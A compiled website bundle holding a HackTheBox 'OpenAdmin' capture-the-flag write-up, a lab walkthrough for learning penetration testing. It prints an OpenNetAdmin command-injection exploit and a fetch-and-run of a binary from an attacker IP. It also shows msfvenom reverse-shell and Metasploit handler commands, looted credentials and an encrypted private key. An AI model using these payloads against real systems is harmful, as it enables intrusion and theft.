"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[130],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>b});var a=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function r(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,a,o=function(e,n){if(null==e)return{};var t,a,o={},i=Object.keys(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):r(r({},n),e)),t},d=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},c="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,o=e.mdxType,i=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),c=p(t),m=o,b=c["".concat(l,".").concat(m)]||c[m]||u[m]||i;return t?a.createElement(b,r(r({ref:n},d),{},{components:t})):a.createElement(b,r({ref:n},d))}));function b(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var i=t.length,r=new Array(i);r[0]=m;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[c]="string"==typeof e?e:o,r[1]=s;for(var p=2;p<i;p++)r[p]=t[p];return a.createElement.apply(null,r)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},53546:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>u,frontMatter:()=>i,metadata:()=>s,toc:()=>p});var a=t(87462),o=(t(67294),t(3905));const i={layout:"post",title:"OpenAdmin ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","web","pe","exploit","htb","sql"],date:"2020/05/01",thumbnail:"/img/HackTheBox/openadmin.png",toc:!0},r=void 0,s={unversionedId:"HackTheBox/OpenAdmin/write-up",id:"HackTheBox/OpenAdmin/write-up",title:"OpenAdmin ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/OpenAdmin/write-up.md",sourceDirName:"HackTheBox/OpenAdmin",slug:"/HackTheBox/OpenAdmin/write-up",permalink:"/writeups/HackTheBox/OpenAdmin/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"web",permalink:"/writeups/tags/web"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"sql",permalink:"/writeups/tags/sql"}],version:"current",frontMatter:{layout:"post",title:"OpenAdmin ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","web","pe","exploit","htb","sql"],date:"2020/05/01",thumbnail:"/img/HackTheBox/openadmin.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Oouch ",permalink:"/writeups/HackTheBox/Oouch/write-up"},next:{title:"Passage ",permalink:"/writeups/HackTheBox/Passage/write-up"}},l={},p=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"Web Application Enumeration",id:"web-application-enumeration",level:3},{value:"Web Application Exploitation",id:"web-application-exploitation",level:3},{value:"System enumeration and exploration in the jungle",id:"system-enumeration-and-exploration-in-the-jungle",level:3},{value:"System Privilege Escalation : www-data to jimmy",id:"system-privilege-escalation--www-data-to-jimmy",level:3},{value:"System Privilege Escalation : jimmy to joanna",id:"system-privilege-escalation--jimmy-to-joanna",level:3},{value:"System Privilege Escalation : joanna to root",id:"system-privilege-escalation--joanna-to-root",level:3}],d={toc:p},c="wrapper";function u(e){let{components:n,...i}=e;return(0,o.kt)(c,(0,a.Z)({},d,i,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,o.kt)("h1",{id:""}),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Name:")," OpenAdmin"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Profile:")," ",(0,o.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/222"},"www.hackthebox.eu")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"mango",src:t(75776).Z,width:"598",height:"381"})),(0,o.kt)("h1",{id:"-1"}),(0,o.kt)("h3",{id:"overview"},"Overview"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Network Enumeration"),": port 80, 22"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Web Application Enumeration"),": find ",(0,o.kt)("inlineCode",{parentName:"li"},"/ona/")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Web Application Exploitation"),": OpenNetAdmin RCE"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"System enumeration and exploration in the jungle"),": mysql creds + 127.0.0.1:52846"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"System Privilege Escalation : www-data to jimmy"),": credential stuffing"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"System Privilege Escalation : jimmy to joanna"),": password crack"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"System Privilege Escalation : joanna to root"),": nano escape")),(0,o.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": port 80, 22"),(0,o.kt)("p",null,"Let's begin by finding open ports with a SYN ",(0,o.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan and then trying\nto run default scripts and finding the version of those services."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo nmap -p- -sS 10.10.10.171 -oA nmap_ports\n[sudo] password for cyfun:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:45 CET\nNmap scan report for 10.10.10.171\nHost is up (0.025s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 31.23 seconds\n\n$ sudo nmap -p 80,22 -sSCV 10.10.10.171 -oA nmap_services\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:46 CET\nNmap scan report for 10.10.10.171\nHost is up (0.024s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)\n|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)\n|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.89 seconds\n")),(0,o.kt)("p",null,"As often, only a web app."),(0,o.kt)("h3",{id:"web-application-enumeration"},"Web Application Enumeration"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": find ",(0,o.kt)("inlineCode",{parentName:"p"},"/ona/")),(0,o.kt)("p",null,"With a web directory finder like ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/maurosoria/dirsearch"},"dirsearch")," or ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf")," and a\ngood wordlist, we can try to enumerate the possible sub-folders."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"[14:04:59] 301 -  312B  - /music  ->  http://10.10.10.171/music/\n[14:05:01] 301 -  314B  - /artwork  ->  http://10.10.10.171/artwork/\n[14:05:04] 403 -  277B  - /server-status\n[14:05:13] 301 -  313B  - /sierra  ->  http://10.10.10.171/sierra/\n")),(0,o.kt)("p",null,"Many rabbit hole sub-directories but on ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.171/music/"},"http://10.10.10.171/music/")," there is a\nlogin button leading to ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.171/ona/"},"http://10.10.10.171/ona/")," where is hosted an\nOpenNetAdmin v18.1.1 instance."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/MY8JRWz.png",alt:"music"})),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/bXYOLS4.png",alt:"ona"})),(0,o.kt)("p",null,"We can see an alert message telling there is a newer version available and that\nwe have version 18.1.1 of ",(0,o.kt)("strong",{parentName:"p"},"OpenNetAdmin"),"."),(0,o.kt)("h3",{id:"web-application-exploitation"},"Web Application Exploitation"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": OpenNetAdmin RCE"),(0,o.kt)("p",null,"With the ",(0,o.kt)("a",{parentName:"p",href:"https://www.archlinux.org/packages/community/any/exploitdb/"},"Exploit-DB")," tool ",(0,o.kt)("inlineCode",{parentName:"p"},"searchsploit")," we search if there are\navailable exploits."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"searchsploit OpenNetAdmin")," shows there is a RCE for 18.1.1."),(0,o.kt)("p",null,"Note: I got some error with the exploit that was due to the EOL char, I copied\nthe exploit and converted CRLF to LF."),(0,o.kt)("p",null,"We just have to give the login URL to the exploit to get a pseudo-shell."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"bash 47691.sh http://10.10.10.171/ona/login.php\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,o.kt)("h3",{id:"system-enumeration-and-exploration-in-the-jungle"},"System enumeration and exploration in the jungle"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": mysql creds + 127.0.0.1:52846"),(0,o.kt)("p",null,"Let's try some basic commands and see if we can find something juicy."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ pwd\n/opt/ona/www\n\n$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\njimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\njoanna:x:1001:1001:,,,:/home/joanna:/bin/bash\n\n$ uname -a\nLinux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n")),(0,o.kt)("p",null,"At some point I ran ",(0,o.kt)("inlineCode",{parentName:"p"},"linpeas.sh")," (from ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/carlospolop/PEASS-ng"},"PEASS suite"),") and found there was\nnot only ",(0,o.kt)("inlineCode",{parentName:"p"},"/opt/ona/www")," related to OpenNetAdmin but also ",(0,o.kt)("inlineCode",{parentName:"p"},"/var/www/html/ona"),"."),(0,o.kt)("p",null,"In there are the database credentials."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"$ cat /var/www/html/ona/local/config/database_settings.inc.php\n<?php\n\n$ona_contexts=array (\n  'DEFAULT' =>\n  array (\n    'databases' =>\n    array (\n      0 =>\n      array (\n        'db_type' => 'mysqli',\n        'db_host' => 'localhost',\n        'db_login' => 'ona_sys',\n        'db_passwd' => 'n1nj4W4rri0R!',\n        'db_database' => 'ona_default',\n        'db_debug' => false,\n      ),\n    ),\n    'description' => 'Default data context',\n    'context_color' => '#D3DBFF',\n  ),\n);\n")),(0,o.kt)("p",null,"At some point I got bored of the pseudo-shell via the RCE exploit so I decided\nto get a meterpreter reverse shell. A better reason is that we can't use\ninteractive client such a mysql client from the RCE so we need a real shell."),(0,o.kt)("p",null,"The RCE exploit is pretty simple:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'#!/bin/bash\n\nURL="${1}"\nwhile true;do\n echo -n "$ "; read cmd\n curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \\"BEGIN\\";${cmd};echo \\"END\\"&xajaxargs[]=ping" "${URL}" | sed -n -e \'/BEGIN/,/END/ p\' | tail -n +2 | head -n -1\ndone\n')),(0,o.kt)("p",null,"So to upload an execute my reverse shell I tried:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \\"BEGIN\\";wget http://10.10.15.151:443/80.bin; chmod +x 80.bin; ./80.bin ;echo \\"END\\"&xajaxargs[]=ping" "http://10.10.10.171/ona/login.php" | sed -n -e \'/BEGIN/,/END/ p\' | tail -n +2 | head -n -1\n')),(0,o.kt)("p",null,"The shell wasn't executed because we can't ",(0,o.kt)("inlineCode",{parentName:"p"},"chmod +x")," for whatever reason."),(0,o.kt)("p",null,"So I tried a trick to execute the shell:\n",(0,o.kt)("inlineCode",{parentName:"p"},"/lib64/ld-linux-x86-64.so.2 /opt/ona/www/80.bin")," but it didn't work."),(0,o.kt)("p",null,"I found a quite useful article ",(0,o.kt)("a",{parentName:"p",href:"https://www.networkworld.com/article/3002286/what-can-you-do-when-you-cant-chmod-chmod.html"},"What can you do when you can't chmod chmod?"),"\nwere I learned about a command to copy the permissions of a binary."),(0,o.kt)("p",null,"So I used ",(0,o.kt)("inlineCode",{parentName:"p"},"getfacl")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"setfacl")," to copy permissions from another binary."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"getfacl /bin/ls | setfacl --set-file=- 80.bin\n")),(0,o.kt)("p",null,"It seems Meterpreter has an upstream bug with shell."),(0,o.kt)("p",null,"So in short here what I did to get my reverse shell:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"# Attacker\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.151 LPORT=80 -f elf > 80.bin\n\n# Target\nwget http://10.10.15.151:443/80.bin\ngetfacl /bin/ls | setfacl --set-file=- 80.bin\n./80.bin\n")),(0,o.kt)("p",null,"Listener + PTY:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp\npayload => linux/x64/shell_reverse_tcp\nmsf5 exploit(multi/handler) > set LPORT 80\nLPORT => 80\nmsf5 exploit(multi/handler) > set LHOST 10.10.15.151\nLHOST => 10.10.15.151\nmsf5 exploit(multi/handler) > run\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n")),(0,o.kt)("p",null,"Now we can use the interactive mysql client with the credentials we looted\nearlier:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p\n\nmysql> show tables;\nshow tables;\n+------------------------+\n| Tables_in_ona_default  |\n+------------------------+\n| blocks                 |\n| configuration_types    |\n| configurations         |\n| custom_attribute_types |\n| custom_attributes      |\n| dcm_module_list        |\n| device_types           |\n| devices                |\n| dhcp_failover_groups   |\n| dhcp_option_entries    |\n| dhcp_options           |\n| dhcp_pools             |\n| dhcp_server_subnets    |\n| dns                    |\n| dns_server_domains     |\n| dns_views              |\n| domains                |\n| group_assignments      |\n| groups                 |\n| host_roles             |\n| hosts                  |\n| interface_clusters     |\n| interfaces             |\n| locations              |\n| manufacturers          |\n| messages               |\n| models                 |\n| ona_logs               |\n| permission_assignments |\n| permissions            |\n| roles                  |\n| sequences              |\n| sessions               |\n| subnet_types           |\n| subnets                |\n| sys_config             |\n| tags                   |\n| users                  |\n| vlan_campuses          |\n| vlans                  |\n+------------------------+\n40 rows in set (0.00 sec)\n\nmysql> select * from users;\nselect * from users;\n+----+----------+----------------------------------+-------+---------------------+---------------------+\n| id | username | password                         | level | ctime               | atime               |\n+----+----------+----------------------------------+-------+---------------------+---------------------+\n|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-03-13 15:46:03 | 2020-03-13 15:46:03 |\n|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2020-03-13 15:45:04 | 2020-03-13 15:45:04 |\n+----+----------+----------------------------------+-------+---------------------+---------------------+\n2 rows in set (0.00 sec)\n")),(0,o.kt)("p",null,"All of that was nearly useless because the password hash of the admin user is\nthe md5 of ",(0,o.kt)("inlineCode",{parentName:"p"},"admin")," so we could have guessed it pretty easily."),(0,o.kt)("p",null,"With ",(0,o.kt)("inlineCode",{parentName:"p"},"ss -nlp")," let list open sockets:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"tcp  LISTEN 0      80                                     127.0.0.1:3306                                            0.0.0.0:*\ntcp  LISTEN 0      128                                    127.0.0.1:52846                                           0.0.0.0:*\ntcp  LISTEN 0      128                                127.0.0.53%lo:53                                              0.0.0.0:*\ntcp  LISTEN 0      128                                      0.0.0.0:22                                              0.0.0.0:*\ntcp  LISTEN 14     128                                            *:80                                                    *:*\ntcp  LISTEN 0      128                                         [::]:22                                                 [::]:*\n")),(0,o.kt)("p",null,"We can see the public web server listening on all interfaces on port 80, the SSH\nserver, the internally exposed database on port 3306, but what's running on port\n52846? Seems it's a web server."),(0,o.kt)("p",null,"The body looks like this:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'   <body>\n\n      <h2>Enter Username and Password</h2>\n      <div class = "container form-signin">\n        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>\n                </div> \x3c!-- /container --\x3e\n\n      <div class = "container">\n\n         <form class = "form-signin" role = "form"\n            action = "/index.php" method = "post">\n            <h4 class = "form-signin-heading"></h4>\n            <input type = "text" class = "form-control"\n               name = "username"\n               required autofocus></br>\n            <input type = "password" class = "form-control"\n               name = "password" required>\n            <button class = "btn btn-lg btn-primary btn-block" type = "submit"\n               name = "login">Login</button>\n         </form>\n\n      </div>\n\n   </body>\n')),(0,o.kt)("p",null,"There is a login page on 127.0.0.1:52846, let's try to login with the creds we\nfound on the database."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"curl -X POST http://127.0.0.1:52846/index.php --data 'username=admin&password=admin&login=Submit'\n")),(0,o.kt)("p",null,"I obtain a ",(0,o.kt)("inlineCode",{parentName:"p"},"Wrong username or password.")," :("),(0,o.kt)("p",null,"But if take a look at the owner of the internal website, it seems it's jimmy:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"www-data@openadmin:/var/www$ ls -lh\nls -lh\ntotal 8.0K\ndrwxr-xr-x 6 www-data www-data 4.0K Nov 22 15:59 html\ndrwxrwx--- 2 jimmy    internal 4.0K Mar 13 15:53 internal\nlrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www\n")),(0,o.kt)("h3",{id:"system-privilege-escalation--www-data-to-jimmy"},"System Privilege Escalation : www-data to jimmy"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": credential stuffing"),(0,o.kt)("p",null,"It could be helpful to read the source code but with ",(0,o.kt)("inlineCode",{parentName:"p"},"www-data")," we are not in\nthe internal group so we need to connect as jimmy to read the source code."),(0,o.kt)("p",null,"A big guessing step involved here: we needed to re-use the MySQL ",(0,o.kt)("inlineCode",{parentName:"p"},"ona_sys")," user\npassword (",(0,o.kt)("inlineCode",{parentName:"p"},"n1nj4W4rri0R!"),") as jimmy PAM password for ssh.\nI think the idea was credentials stuffing if jimmy is the dev of the internal\nweb app he may have reused his own personal password for dev purpose like the\nDB."),(0,o.kt)("p",null,"Now cen can connect and look at the source code:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ssh jimmy@10.10.10.171\n\njimmy@openadmin:~$ ls -la /var/www/internal/\ntotal 20\ndrwxrwx--- 2 jimmy internal 4096 Mar 13 15:53 .\ndrwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..\n-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php\n-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php\nlrwxrwxrwx 1 jimmy jimmy      17 Mar 13 15:53 lol -> /var/www/html/lol\n-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php\n")),(0,o.kt)("p",null,"In ",(0,o.kt)("inlineCode",{parentName:"p"},"index.php")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n            $msg = '';\n\n            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {\n              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {\n                  $_SESSION['username'] = 'jimmy';\n                  header(\"Location: /main.php\");\n              } else {\n                  $msg = 'Wrong username or password.';\n              }\n            }\n         ?>\n")),(0,o.kt)("p",null,"The password of jimmy (for the internal web app) is hardcoded and we can break\nthe SHA512 with an online service for example."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1")," -> ",(0,o.kt)("inlineCode",{parentName:"p"},"Revealed")),(0,o.kt)("p",null,"So we can connect as jimmy and be redirected to ",(0,o.kt)("inlineCode",{parentName:"p"},"main.php")," (",(0,o.kt)("inlineCode",{parentName:"p"},'header("Location: /main.php");'),")."),(0,o.kt)("h3",{id:"system-privilege-escalation--jimmy-to-joanna"},"System Privilege Escalation : jimmy to joanna"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": password crack"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'$ curl -X POST http://127.0.0.1:52846/index.php --data \'username=jimmy&password=Revealed&login=Submit\'\n\n$ curl -X POST http://127.0.0.1:52846/main.php\n<pre>-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D\n\nkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8\nad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO\nShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE\n6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ\nZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du\ny8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI\n9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4\npiC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/\n/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH\n40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ\nfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\nX1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\nS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\nFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\nTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\nRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\nuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\nXGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\nyPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\nqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\nz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\nK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n-----END RSA PRIVATE KEY-----\n</pre>uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)\n<html>\n<h3>Don\'t forget your "ninja" password</h3>\nClick here to logout <a href="logout.php" tite = "Logout">Session\n</html>\n')),(0,o.kt)("p",null,"We could also have look at ",(0,o.kt)("inlineCode",{parentName:"p"},"main.php")," directly on the file system too but I\nwanted to follow the application logic."),(0,o.kt)("p",null,"It seems we have a private key from ",(0,o.kt)("inlineCode",{parentName:"p"},"joanna")," user, which is 